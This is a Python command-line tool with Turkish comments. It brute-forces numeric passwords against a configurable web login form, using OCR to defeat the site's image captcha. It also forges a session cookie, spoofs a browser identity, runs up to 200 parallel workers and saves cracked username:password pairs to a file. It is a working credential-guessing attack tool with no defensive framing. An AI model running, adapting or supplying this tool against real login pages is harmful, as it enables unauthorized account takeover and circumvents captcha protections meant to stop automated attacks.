#!/usr/bin/env python3
from __future__ import annotations

import argparse
import json
import os
import random
import secrets
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from io import BytesIO
from threading import Lock
from typing import Optional
from urllib.parse import urljoin
import xml.etree.ElementTree as ET

os.environ["ORT_LOGGING_LEVEL"] = "3"
os.environ["ONNXRUNTIME_LOG_LEVEL"] = "3"

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def _import_ocr():
    saved = os.dup(2)
    devnull = os.open(os.devnull, os.O_WRONLY)
    os.dup2(devnull, 2)
    os.close(devnull)
    try:
        import ddddocr
        return ddddocr
    finally:
        os.dup2(saved, 2)
        os.close(saved)


ddddocr = _import_ocr()
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


RESULT_FILE = "result.txt"

_result_lock = Lock()
_print_lock  = Lock()
_found_flag  = {"stop": False}


# ---------- Varsayılan yapılandırma ----------
# Tüm hedefe özel değerler burada. Config dosyası ile geçersiz kılınır.
DEFAULT_CONFIG = {
    "base_url": None,                       # ZORUNLU: hedef sitenin kök adresi
    "login_page": "/",                      # giriş sayfası yolu
    "login_endpoints": ["/login"],          # POST atılacak endpoint'ler (sırayla denenir)
    "captcha_url": "/captcha.jpg?captchaId={captcha_id}",
    "cookie_name": "session_id",            # login öncesi set edilen cookie adı
    "cookie_length": 32,                    # cookie değerinin hex uzunluğu

    # Form alanı isimleri
    "form_fields": {
        "captcha_id":       "captchaId",
        "captcha_response": "captchaResponse",
        "ga_code":          "gaCode",
        "op":               "l_op",
        "user":             "l_un",
        "pass":             "l_pw",
        "remember":         "l_kmli",
        "redirect":         "l_ru",
    },

    # Form alanlarına yazılacak sabit değerler
    "form_values": {
        "op":       "login",
        "remember": "false",
        "redirect": "",
    },

    # Sunucu yanıtındaki XML tag isimleri
    "xml_tags": {
        "message":  "message",
        "key":      "key",
        "csid":     "csidValue",
        "sid":      "sidValue",
        "redirect": "redirectURL",
    },

    # Başarılı girişte sunucunun döndürdüğü mesaj
    "success_code": "100",

    # Captcha tahmin uzunluğu aralığı
    "captcha_length": {"min": 4, "max": 5},
}


def deep_merge(base: dict, override: dict) -> dict:
    """İç içe dict'leri birleştirir. Override değerleri base'i ezer."""
    out = dict(base)
    for k, v in override.items():
        if k in out and isinstance(out[k], dict) and isinstance(v, dict):
            out[k] = deep_merge(out[k], v)
        else:
            out[k] = v
    return out


def load_config(path: Optional[str]) -> dict:
    cfg = dict(DEFAULT_CONFIG)
    if path and os.path.isfile(path):
        with open(path, "r", encoding="utf-8") as f:
            user_cfg = json.load(f)
        cfg = deep_merge(DEFAULT_CONFIG, user_cfg)
    if not cfg.get("base_url"):
        raise SystemExit(
            "[x] base_url tanımlı değil.\n"
            "    Bir config dosyası verin:  --config config.json\n"
            "    Şablon oluşturmak için:     --dump-config config.json"
        )
    return cfg


def dump_default_config(path: str) -> None:
    """Örnek config dosyası yazar."""
    tmpl = dict(DEFAULT_CONFIG)
    tmpl["base_url"] = "https://example.com"
    tmpl["login_page"] = "/login"
    tmpl["login_endpoints"] = ["/login"]
    tmpl["captcha_url"] = "/captcha.jpg?captchaId={captcha_id}"
    with open(path, "w", encoding="utf-8") as f:
        json.dump(tmpl, f, indent=2, ensure_ascii=False)
    print(f"[+] Örnek config yazıldı: {path}")


# ---------- Config'ten türetilen global ----------
CFG: dict = {}


def build_urls(cfg: dict) -> None:
    """URL'leri config'ten üret ve global CFG'ye yaz."""
    global CFG
    CFG = cfg
    base = cfg["base_url"].rstrip("/")
    cfg["_login_page_url"] = base + cfg["login_page"]
    cfg["_login_post_urls"] = [base + p for p in cfg["login_endpoints"]]
    cfg["_captcha_url_tpl"] = base + cfg["captcha_url"]
    cfg["_origin"] = base


# ---------- Thread-local OCR ----------
_thread_local = threading.local()


def get_solver() -> "Captcha":
    solver = getattr(_thread_local, "solver", None)
    if solver is None:
        solver = Captcha()
        _thread_local.solver = solver
    return solver


# ---------- Captcha ----------
class Captcha:
    def __init__(self) -> None:
        self._ocr = ddddocr.DdddOcr(show_ad=False)

    @staticmethod
    def _preprocess(b: bytes) -> bytes:
        try:
            from PIL import Image, ImageOps, ImageFilter
        except ImportError:
            return b
        img = Image.open(BytesIO(b)).convert("L")
        img = ImageOps.autocontrast(img).filter(ImageFilter.MedianFilter(3))
        w, h = img.size
        img = img.resize((w * 2, h * 2), Image.LANCZOS)
        buf = BytesIO()
        img.save(buf, format="PNG")
        return buf.getvalue()

    def solve(self, img: bytes) -> str:
        lo = CFG["captcha_length"]["min"]
        hi = CFG["captcha_length"]["max"]
        best = ""
        for i in range(2):
            data = self._preprocess(img) if i else img
            guess = self._ocr.classification(data).strip()
            if lo <= len(guess) <= hi and guess.isalnum():
                return guess
            if len(guess) > len(best):
                best = guess
        return best


# ---------- Terminal ----------
def log(msg: str = "") -> None:
    with _print_lock:
        print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)


def set_line(up_n: int, text: str) -> None:
    with _print_lock:
        sys.stdout.write("\x1b[s")
        if up_n > 0:
            sys.stdout.write(f"\x1b[{up_n}A")
        sys.stdout.write(f"\r\x1b[2K{text}")
        sys.stdout.write("\x1b[u")
        sys.stdout.flush()


def clear_lines(n: int) -> None:
    if n <= 0:
        return
    with _print_lock:
        for _ in range(n):
            sys.stdout.write("\x1b[1A\x1b[2K")
        sys.stdout.flush()


# ---------- HTTP ----------
def new_session() -> requests.Session:
    s = requests.Session()
    adapter = HTTPAdapter(
        pool_connections=10,
        pool_maxsize=20,
        max_retries=Retry(total=0, backoff_factor=0),
    )
    s.mount("https://", adapter)
    s.mount("http://", adapter)
    s.headers.update({
        "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                       "AppleWebKit/537.36 (KHTML, like Gecko) "
                       "Chrome/120.0.0.0 Safari/537.36"),
        "Accept-Language": "tr-TR,tr;q=0.9,en;q=0.8",
        "Connection": "keep-alive",
    })
    return s


def post_login(session, payload) -> Optional[requests.Response]:
    for url in CFG["_login_post_urls"]:
        try:
            r = session.post(url, data=payload, timeout=10)
        except requests.RequestException:
            continue
        if r.status_code in (404, 405):
            continue
        return r
    return None


def new_captcha_id() -> str:
    return str(int(time.time() * 1000) + random.randint(0, 100))


def classify(message: str, key: str, csid: int) -> str:
    m = message.lower()
    if message == CFG["success_code"]:
        return "success"
    if "guvenlik" in m or "güvenlik" in m or "captcha" in m:
        return "captcha"
    yanlis = "yanlis" in m or "yanlış" in m or "hatali" in m or "hatalı" in m
    if ("sifre" in m or "şifre" in m) and yanlis:
        return "credentials"
    if ("kullanici" in m or "kullanıcı" in m) and yanlis:
        return "credentials"
    if "sifre" in m or "şifre" in m:
        return "credentials"
    if "kullanici" in m or "kullanıcı" in m:
        return "credentials"
    if "kilit" in m or "blok" in m:
        return "other"
    if "oturum" in m or "session" in m:
        return "other"
    if key == "409" or csid >= 3:
        return "captcha"
    return "other"


def fetch_captcha(session, captcha_id: str) -> Optional[bytes]:
    url = CFG["_captcha_url_tpl"].format(captcha_id=captcha_id)
    try:
        r = session.get(url, timeout=8)
        return r.content
    except requests.RequestException:
        return None


def write_result(user: str, password: str) -> None:
    with _result_lock:
        try:
            with open(RESULT_FILE, "a", encoding="utf-8") as f:
                f.write(f"{user}:{password}\n")
        except OSError as e:
            log(f"[x] Sonuç dosyası yazılamadı: {e}")


# ---------- Login ----------
def login(user: str, password: str) -> bool:
    solver = get_solver()
    session = new_session()

    try:
        session.get(CFG["_login_page_url"], timeout=8).raise_for_status()
    except requests.RequestException:
        return False

    # Cookie değeri config'e göre üret
    cookie_val = secrets.token_hex(max(1, CFG["cookie_length"] // 2))
    session.cookies.set(CFG["cookie_name"], cookie_val, path="/")

    session.headers.update({
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": CFG["_origin"],
        "Referer": CFG["_login_page_url"],
        "Accept": "text/xml, application/xml, */*; q=0.01",
    })

    ff = CFG["form_fields"]
    fv = CFG["form_values"]
    tags = CFG["xml_tags"]

    captcha_response = ""
    captcha_id = new_captcha_id()
    captcha_attempt = 0

    while captcha_attempt < 8:
        payload = {
            ff["captcha_id"]:       captcha_id,
            ff["captcha_response"]: captcha_response,
            ff["ga_code"]:          cookie_val,
            ff["op"]:               fv["op"],
            ff["user"]:             user,
            ff["pass"]:             password,
            ff["remember"]:         fv["remember"],
            ff["redirect"]:         fv["redirect"],
        }

        r = post_login(session, payload)
        if r is None:
            return False

        try:
            root = ET.fromstring(r.text)
        except ET.ParseError:
            return False

        message = root.findtext(tags["message"], default="")
        key     = root.findtext(tags["key"], default="")
        try:
            csid = int(root.findtext(tags["csid"], default="0") or "0")
        except ValueError:
            csid = 0

        tur = classify(message, key, csid)

        if tur == "success":
            return True
        if tur == "credentials":
            return False
        if tur == "other":
            return False

        captcha_attempt += 1
        captcha_id = new_captcha_id()
        img_bytes = fetch_captcha(session, captcha_id)
        if img_bytes is None:
            return False
        captcha_response = solver.solve(img_bytes)

    return False


def login_with_delay(user: str, password: str, wait: float) -> bool:
    try:
        return login(user, password)
    finally:
        if wait > 0:
            time.sleep(wait)


# ---------- Validation ----------
def validate_args(user: str, length: int, start: int,
                  wait: float, workers: int) -> bool:
    if not user.isdigit():
        log("[x] Kullanıcı adı sadece rakamlardan oluşmalıdır")
        return False
    if length < 1 or length > 12:
        log("[x] Şifre uzunluğu 1-12 arasında olmalıdır")
        return False
    if start < 0:
        log("[x] Başlangıç değeri negatif olamaz")
        return False
    max_val = 10 ** length - 1
    if start > max_val:
        log(f"[x] Başlangıç değeri aralığı aşıyor (max {max_val})")
        return False
    if wait < 0:
        log("[x] Bekleme negatif olamaz")
        return False
    if workers < 1 or workers > 200:
        log("[x] Worker sayısı 1-200 arasında olmalıdır")
        return False
    return True


# ---------- Brute Force ----------
def brute_force(user: str, length: int, start: int,
                wait: float, workers: int) -> Optional[str]:
    max_val = 10 ** length - 1
    total = max_val - start + 1

    log(f"[*] Hedef    : {CFG['base_url']}")
    log(f"[*] Kullanıcı: {user}")
    log(f"[*] Uzunluk  : {length} hane")
    log(f"[*] Aralık   : {start:0{length}d} -> {max_val:0{length}d}")
    log(f"[*] Toplam   : {total} deneme")
    log(f"[*] Worker   : {workers}  |  Bekleme: {wait}s")
    log()

    ex = ThreadPoolExecutor(max_workers=workers)
    try:
        val = start
        tried = 0
        t0 = time.time()

        while val <= max_val and not _found_flag["stop"]:
            batch = list(range(val, min(val + workers, max_val + 1)))
            n = len(batch)

            with _print_lock:
                for p in batch:
                    sys.stdout.write(f"deniyor: {p:0{length}d}  [....]\n")
                sys.stdout.flush()

            fut_map = {}
            for i, p in enumerate(batch):
                pwd = f"{p:0{length}d}"
                fut = ex.submit(login_with_delay, user, pwd, wait)
                fut_map[fut] = (i, p)

            found_pwd = None
            for fut in as_completed(fut_map):
                i, p = fut_map[fut]
                try:
                    ok = fut.result()
                except Exception:
                    ok = False

                up_n = n - i
                pwd_str = f"{p:0{length}d}"

                if ok:
                    set_line(up_n, f"deniyor: {pwd_str}  [DOĞRU]")
                    found_pwd = p
                    _found_flag["stop"] = True
                    break
                else:
                    set_line(up_n, f"deniyor: {pwd_str}  [yanlış]")

            tried += n

            if found_pwd is not None:
                pwd_str = f"{found_pwd:0{length}d}"
                for f in fut_map:
                    if not f.done():
                        f.cancel()

                with _print_lock:
                    sys.stdout.write(f">>> bulundu: {pwd_str} <<<\n")
                    sys.stdout.flush()

                write_result(user, pwd_str)
                elapsed = time.time() - t0
                log(f"[+] Süre: {elapsed:.2f}s  |  Denenen: {tried}/{total}")
                return pwd_str

            clear_lines(n)
            val += workers

        log("[-] Şifre bulunamadı, aralık tükendi")
        return None

    except KeyboardInterrupt:
        sys.stdout.write("\n")
        log("[!] Kullanıcı tarafından durduruldu")
        return None
    finally:
        ex.shutdown(wait=False)


# ---------- CLI ----------
def main() -> int:
    p = argparse.ArgumentParser(
        usage="%(prog)s <kullaniciadi> <uzunluk> <baslangic> "
              "--config config.json [-w BEKLEME] [-t WORKER]",
        description="Genel amaçlı şifre bulucu (paralel, batch, canlı durum)",
    )
    p.add_argument("user", help="Kullanıcı adı (sadece rakam)")
    p.add_argument("length", type=int, help="Şifre uzunluğu")
    p.add_argument("start", type=int, help="Başlangıç sayısı")
    p.add_argument("--config", default="config.json",
                   help="JSON yapılandırma dosyası (varsayılan: config.json)")
    p.add_argument("--dump-config", metavar="PATH",
                   help="Örnek config dosyası yaz ve çık")
    p.add_argument("-w", "--wait", type=float, default=0.0,
                   help="Her deneme arası bekleme (saniye)")
    p.add_argument("-t", "--threads", type=int, default=10,
                   help="Paralel worker sayısı (varsayılan 10)")
    args = p.parse_args()

    if args.dump_config:
        dump_default_config(args.dump_config)
        return 0

    try:
        cfg = load_config(args.config)
    except SystemExit as e:
        print(e)
        return 1

    build_urls(cfg)

    if not validate_args(args.user, args.length, args.start,
                         args.wait, args.threads):
        return 1

    result = brute_force(args.user, args.length, args.start,
                         args.wait, args.threads)
    return 0 if result else 1


if __name__ == "__main__":
    sys.exit(main())
